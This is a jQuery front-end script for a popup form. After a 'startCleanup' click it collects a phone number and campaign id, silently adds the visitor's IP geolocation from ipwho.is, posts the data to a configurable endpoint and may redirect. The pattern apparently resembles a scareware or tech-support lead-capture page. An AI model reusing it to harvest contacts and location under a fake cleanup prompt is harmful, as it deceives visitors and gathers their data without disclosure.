$(document).ready(function () {
    $('#startCleanup').click(() => {
        $('.popup.alert').hide();
        $('.popup.form').show();
    });

    $('.popup-form').submit(async function (e) {
        e.preventDefault();
        console.log('popup form');
        $('#submitform').prop('disabled', true);
        const formData = $(this).serializeArray();
        const url = $(this).attr('cluster-url');

        const cid = new URLSearchParams(window.location.search).get('cid');
        const data = { cid };

        $(formData).each(function (index, obj) {
            data[obj.name] = obj.value;
        });

        if (data.phone.includes('_')) return;

        const geodata = await fetch('https://ipwho.is/').then((res) =>
            res.json(),
        );
        data.geodata = geodata;

        $.ajax({
            type: 'POST',
            url,
            contentType: 'application/json',
            data: JSON.stringify(data),
            success(res) {
                type = res.type;
                if (res.call == 0) {
                    if (type == 'Redirect') {
                        window.location.href = res.redirection_url;
                    } else {
                        $('.popup.form form').hide();
                    }
                } else if (res.call == 1) {
                    if (type == 'Redirect') {
                        redirection = res.redirection_url;
                    }
                    $('.popup.form form').hide();
                }
            },
        });
        $('.popup.form').prop('disabled', false);
    });

    $("input[type='tel']").inputmask({
        mask: '+1 (P99) 999-9999',
        definitions: { P: { validator: '[2-9]' } },
    });

    $("input[type='tel']").keypress(function (e) {
        var charCode = e.which ? e.which : e.keyCode;
        const s = String.fromCharCode(charCode);
        if (!s.match(/^[0-9\+]/)) return false;
    });

    $('.popup.form form').submit(async function (e) {
        e.preventDefault();
        $('.popup.form').prop('disabled', true);
        const formData = $(this).serializeArray();
        const url = $(this).attr('cluster-url');
        const cid = new URLSearchParams(window.location.search).get('cid');
        const data = { cid };

        $(formData).each(function (index, obj) {
            data[obj.name] = obj.value;
        });

        if (data.phone.includes('_')) return;

        const geodata = await fetch('https://ipwho.is/').then((res) =>
            res.json(),
        );
        data.geodata = geodata;

        $.ajax({
            type: 'POST',
            url,
            contentType: 'application/json',
            data: JSON.stringify(data),
            success(res) {
                type = res.type;
                if (res.call == 0) {
                    if (type == 'Redirect') {
                        window.location.href = res.redirection_url;
                    } else {
                        $('.popup.form form').hide();
                    }
                } else if (res.call == 1) {
                    if (type == 'Redirect') {
                        redirection = res.redirection_url;
                    }
                    $('.popup.form form').hide();
                }
            },
        });
        $('.popup.form').prop('disabled', false);
    });
});

document.querySelector("input[type='tel']").addEventListener('change', (e) => {
    console.log(e.target.value);
});
